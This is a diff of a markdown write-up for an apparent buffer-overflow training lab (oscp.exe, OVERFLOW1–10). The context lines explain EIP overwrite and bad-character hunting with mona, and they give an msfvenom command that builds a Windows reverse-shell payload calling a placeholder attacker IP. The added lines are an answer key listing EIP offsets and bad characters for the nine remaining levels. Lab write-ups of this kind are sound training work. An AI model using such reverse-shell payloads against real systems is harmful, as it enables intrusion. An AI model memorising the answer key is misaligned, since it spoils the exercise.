@@ -90,21 +90,40 @@ So I rerun the program and the script: <br />
 As shown in the image above, the EIP is overwritten with 4 Bs, and the ESP is overwritten with `01B3FA30`. Now to check bad characters, first run `!mona bytearray -b "\x00"`. This will create a file containing the list of characters in hex. Then run `!mona compare -f C:\mona\oscp\bytearray.bin -a 01B3FA30`.<br />
 ![image](https://github.com/user-attachments/assets/adb4df98-43e9-47b2-9819-19437d7449c2)<br />
 The bad characters found by mona are `00,07,2e,a0`. So the final answer is `\x00\x07\x2e\xa0`. This is going to be useful to create the shellcode, for example:  `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=9001 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c`:<br />
+For the next taks the procedure is the same.
 
 ### oscp.exe - OVERFLOW2
+- What is the EIP offset for OVERFLOW2? `634`
+- In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW2? `\x00\x23\x3c\x83\xba`
 
 ### oscp.exe - OVERFLOW3
+- What is the EIP offset for OVERFLOW3? `1274`
+- In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW3? `\x00\x11\x40\x5F\xb8\xee`
 
 ### oscp.exe - OVERFLOW4
+- What is the EIP offset for OVERFLOW4? `2026`
+- In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW4? `\x00\xa9\xcd\xd4`
 
 ### oscp.exe - OVERFLOW5
+- What is the EIP offset for OVERFLOW5? `314`
+- In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW5? `\x00\x16\x2f\xf4\xfd`
 
 ### oscp.exe - OVERFLOW6
+- What is the EIP offset for OVERFLOW6? `1034`
+- In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW6? `\x00\x08\x2c\xad`
 
 ### oscp.exe - OVERFLOW7
+- What is the EIP offset for OVERFLOW7? `1306`
+- In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW7? `\x00\x8c\xae\xbe\xfb`
 
 ### oscp.exe - OVERFLOW8
+- What is the EIP offset for OVERFLOW8? `1786`
+- In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW8? `\x00\x1d\x2e\xc7\xee`
 
 ### oscp.exe - OVERFLOW9
+- What is the EIP offset for OVERFLOW9? `1514`
+- In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW9? `\x00\x04\x3e\x3f\xe1`
 
 ### oscp.exe - OVERFLOW10
+- What is the EIP offset for OVERFLOW10? `537`
+- In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW10? `\x00\xa0\xad\xbe\xde\xef`
